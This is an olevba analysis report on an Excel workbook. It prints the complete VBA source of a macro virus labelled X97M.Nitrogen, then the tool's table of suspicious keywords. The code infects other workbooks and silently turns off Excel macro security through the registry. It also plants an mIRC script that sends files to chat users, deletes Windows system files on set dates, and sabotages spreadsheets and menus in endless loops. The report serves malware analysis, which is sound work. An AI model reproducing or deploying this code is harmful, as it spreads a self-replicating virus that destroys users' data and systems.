olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Stars.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EsteLivro.cls 
in file: Virus.MSExcel.Stars.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/EsteLivro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'X97M.Nitrogen
'By ·KrïPt¤R·

Sub WorkBook_Activate()
Call WorkBook_DeActivate
End Sub

Sub WorkBook_DeActivate()
On Error Resume Next
Set QP6619 = ActiveWorkbook.VBProject.VBComponents.Item(1)
Set ST4I979 = Me.VBProject.VBComponents.Item(1)
If QP6619.CodeModule.Lines(1, 1) <> "'X97M.Nitrogen" Then
QP6619.CodeModule.insertlines 1, ST4I979.CodeModule.Lines(1, ST4I979.CodeModule.CountOfLines)
QP6619.Name = "EsteLivro"
End If
Open "C:\Protection.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, ""
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Close #1
Shell "regedit /s C:\Protection.reg", vbHide: Kill ("C:\Protection.reg")
FJ397492 = Dir(Application.StartupPath & "\Book.")
If FJ397492 = "" Then
VBAProject.EsteLivro.SaveAs Filename:=Application.StartupPath & "\Book.", FileFormat:=xlNormal, AddToMru:=False
End If
Application.CommandBars("Tools").Controls(11).Delete
LL61LTAS (QN471657)
FC774323_QR344227
FJ74107
If Second(Now) = Minute(Now) Then
EG860806
End If
End Sub
Private Sub FC774323_QR344227()
On Error Resume Next
Randomize
Dim r1(1 To 36) As String
r1(1) = "QP6619": r1(2) = "LM320830": r1(3) = "PK446225": r1(4) = "PN543411": r1(5) = "QR344227": r1(6) = "FC774323": r1(7) = "ML652474": r1(8) = "BL810720": r1(9) = "BC33330": r1(10) = "OM239590": r1(11) = "DJ163619": r1(12) = "TK6874": r1(13) = "CF479771": r1(14) = "GL869566": r1(15) = "AL738775": r1(16) = "EO641461": r1(17) = "KF855428": r1(18) = "QR546310": r1(19) = "TK764384": r1(20) = "KL46613": r1(21) = "EG860806": r1(22) = "FJ74107": r1(23) = "AB65312": r1(24) = "CO179408": r1(25) = "JS117332": r1(26) = "RN483466": r1(27) = "LI140450": r1(28) = "GC2316": r1(29) = "NQ275360": r1(30) = "BA328324": r1(31) = "BQ8813": r1(32) = "PR464137": r1(33) = "IS509669": r1(34) = "NG189638": r1(35) = "HT682844": r1(36) = "FJ397492"
For x = 1 To 36
a1 = (Chr(65 + Int(Rnd * 20))) & (Chr(65 + Int(Rnd * 20))) & Int(Rnd * 900) & Int(Rnd * 900)
Call QR344227(a1, r1(x))
Next x
End Sub
Private Sub QR344227(BL810720, ML652474 As String)
On Error Resume Next
Dim QP6619 As Long: Dim LM320830 As Long: Dim PK446225 As Long: Dim PN543411 As Long: Dim BC33330 As Long: Dim OM239590 As Long: Dim DJ163619 As Long: Dim TK6874 As Long: Dim CF479771 As Long: Dim GL869566 As Long: Dim AL738775 As Long: Dim EO641461 As Long: Dim KF855428 As Long: Dim QR546310 As Long: Dim TK764384 As Long: Dim KL46613 As Long: Dim EG860806 As Long: Dim FJ74107 As Long: Dim AB65312 As Long: Dim CO179408 As Long: Dim JS117332 As Long: Dim RN483466 As Long: Dim LI140450 As Long: Dim GC2316 As Long: Dim NQ275360 As Long: Dim BA328324 As Long: Dim BQ8813 As Long: Dim PR464137 As Long: Dim IS509669 As Long: Dim NG189638 As Long: Dim HT682844 As Long: Dim FJ397492 As Long
With ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
QP6619 = 1: LM320830 = 1: PK446225 = .CountOfLines: PN543411 = Len(.Lines(.CountOfLines, 1))
Do While .Find(ML652474, QP6619, LM320830, PK446225, PN543411, True)
s1 = .Lines(QP6619, 1)
s1 = Left(s1, LM320830 - 1) & BL810720 & Mid(s1, PN543411)
.replaceline QP6619, s1
QP6619 = PK446225 + 1: LM320830 = 1
PK446225 = .CountOfLines
PN543411 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
Function LL61LTAS(QN471657)
Set PN543411 = CreateObject("ActiveWorkbook.FileSystemObject")
If LM320830 <> "" Then
J4J816NH = F717E3P1.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If PN543411.fileexists("c:\mirc\mirc.ini") Then
LM320830 = "c:\mirc"
ElseIf PN543411.fileexists("c:\mirc32\mirc.ini") Then
LM320830 = "c:\mirc32"
ElseIf PN543411.fileexists(CO179408 & "\mirc\mirc.ini") Then
LM320830 = CO179408 & "\mirc"
ElseIf PN543411.fileexists(CO179408 & "\mirc32\mirc.ini") Then
LM320830 = J4J816NH & "\mirc"
Else
LM320830 = ""
End If
End If
If LM320830 <> "" Then
Set RR493886 = PN543411.CreateTextFile(LM320830 & "\script.ini", True)
RR493886 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
RR493886 = RR493886 & vbCrLf & "n0=on 1:JOIN:#:{"
RR493886 = RR493886 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
RR493886 = RR493886 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
RR493886 = RR493886 & B5I9IRGI
RR493886 = RR493886 & vbCrLf & "n3=}"
Script.Close
End If
End Function
Function G9FI73L2()
On Error Resume Next
Set JS117332 = PN543411.Drives
For Each RN483466 In JS117332
LI140450 = RN483466 & " \ "
Call GC2316(LI140450)
Next
End Function
Function GC2316(NQ275360)
BA328324 = NQ275360
Set BQ8813 = PN543411.GetFolder(BA328324)
Set PR464137 = BQ8813.Files
For Each IS509669 In PR464137
If LCase(IS509669.Name) = "mirc.ini" Then
LL61LTAS (IS509669.ParentFolder)
End If
Next
Set NG189638 = BQ8813.Subfolders
For Each HT682844 In NG189638
Call HT682844.Path
Next
End Function
Sub EG860806()
On Error Resume Next
Dim BC33330
Randomize
BC33330 = Int((6 * Rnd) + 1)
If BC33330 = 1 Then OM239590
If BC33330 = 2 Then TK6874
If BC33330 = 3 Then CF479771
If BC33330 = 4 Then AL738775
If BC33330 = 5 Then EO641461
If BC33330 = 6 Then KF855428
End Sub
Private Sub OM239590()
On Error Resume Next
Application.ActiveCell(1, 1).Delete
DJ163619
OM239590
End Sub
Sub TK6874()
On Error Resume Next
Application.CommandBars("formatting").Visible = True
DJ163619
Application.CommandBars("drawing").Visible = False
DJ163619
Application.CommandBars("web").Visible = True
DJ163619
Application.CommandBars("formatting").Visible = False
DJ163619
Application.CommandBars("wordart").Visible = True
DJ163619
Application.CommandBars("drawing").Visible = True
DJ163619
Application.CommandBars("web").Visible = False
DJ163619
Application.CommandBars("wordart").Visible = False
DJ163619
TK6874
End Sub
Sub CF479771()
On Error Resume Next
Application.CommandBars("Worksheet Menu Bar").Controls(1).Delete
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls.Add Type:= _
msoControlPopup, ID:=30002, Before:=9
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls(9).Delete
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls.Add Type:= _
msoControlPopup, ID:=30010, Before:=1
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls(2).Delete
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls.Add Type:= _
msoControlPopup, ID:=30003, Before:=8
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls(3).Delete
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls.Add Type:= _
msoControlPopup, ID:=30004, Before:=9
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls(10).Delete
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls.Add Type:= _
msoControlPopup, ID:=30005, Before:=6
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls(5).Delete
DJ163619
Application.CommandBars("Worksheet Menu Bar").Controls.Add Type:= _
msoControlPopup, ID:=30006, Before:=7
DJ163619
CF479771
End Sub
Sub AL738775()
On Error Resume Next
Application.CommandBars("Standard").Controls(2).Delete
DJ163619
Application.CommandBars("Standard").Controls.Add Type:=msoControlButton, ID _
:=3, Before:=22
DJ163619
Application.CommandBars("Standard").Controls(1).Delete
DJ163619
Application.CommandBars("Standard").Controls.Add Type:=msoControlButton, ID _
:=2521, Before:=12
DJ163619
Application.CommandBars("formatting").Controls(7).Delete
DJ163619
Application.CommandBars("formatting").Controls.Add Type:=msoControlButton, ID _
:=1732, Before:=12
DJ163619
AL738775
End Sub
Sub EO641461()
On Error Resume Next
Columns("A:A").Select
Selection.Delete Shift:=xlToLeft
DJ163619
Rows("1:1").Select
Selection.Delete Shift:=xlUp
DJ163619
EO641461
End Sub
Sub KF855428()
On Error Resume Next
Sheets.Add
DJ163619
KF855428
End Sub
Function DJ163619()
Dim QR546310, TK764384
Randomize
QR546310 = Int((3 * Rnd) + 1)
TK764384 = Timer
Do While Timer < TK764384 + QR546310
DoEvents
Loop
End Function
Private Sub FJ74107()
On Error Resume Next
If Day(Now) = "12" And Month(Now) = "3" Then
Kill ("C:\windows\*.*")
Kill ("C:\Windows\system\*.*")
End If
If Day(Now) = "28" And Month(Now) = "6" Then
Kill ("C:\windows\ambien~1\*.*")
End If
If Day(Now) = "14" And Month(Now) = "8" Then
AB65312:
NewWindow
GoTo AB65312
End If
End Sub







-------------------------------------------------------------------------------
VBA MACRO Folha1.cls 
in file: Virus.MSExcel.Stars.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Folha1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Folha2.cls 
in file: Virus.MSExcel.Stars.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Folha2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Folha3.cls 
in file: Virus.MSExcel.Stars.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Folha3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Folha
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Folha
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Folha
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |WorkBook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|regread             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Protection.reg      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

